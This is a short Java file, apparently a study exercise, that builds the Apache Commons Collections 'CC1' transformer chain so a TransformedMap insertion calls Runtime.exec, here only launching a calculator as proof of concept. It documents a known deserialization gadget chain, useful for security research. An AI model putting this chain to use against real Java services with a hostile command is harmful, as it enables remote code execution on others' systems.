package com.sweet.commonscollections;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;


/**
 * @author sweet
 * @description
 * @date 2021/2/23 10:11
 */
public class CC1 {
    public static void main(String[] args) {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map innerMap = new HashMap<>(16);

        Map outMap = TransformedMap.decorate(innerMap, null, chainedTransformer);
        outMap.put("test", "xxx");
    }
}
